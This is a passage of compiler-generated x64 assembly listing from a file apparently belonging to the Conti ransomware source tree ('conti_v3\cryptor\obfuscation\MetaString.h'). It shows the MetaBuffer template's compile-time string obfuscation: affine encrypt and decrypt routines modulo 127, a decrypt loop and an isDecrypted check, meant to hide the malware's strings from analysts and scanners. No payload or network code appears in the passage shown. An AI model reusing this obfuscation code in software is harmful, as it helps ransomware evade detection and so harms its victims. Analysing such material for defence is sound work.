  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000dd	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  000e1	88 85 c0 00 00
	00		 mov	 BYTE PTR tv94[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  000e7	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000ee	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  000f5	5f		 pop	 rdi
  000f6	5d		 pop	 rbp
  000f7	c3		 ret	 0
??0?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 2f	 sub	 eax, 47			; 0000002fH
  0002d	6b c0 37	 imul	 eax, eax, 55		; 00000037H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 61	 imul	 eax, eax, 97		; 00000061H
  0002d	83 c0 2f	 add	 eax, 47			; 0000002fH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEBA_NXZ ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 72	 cmp	 QWORD PTR i$1[rbp], 114	; 00000072H
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
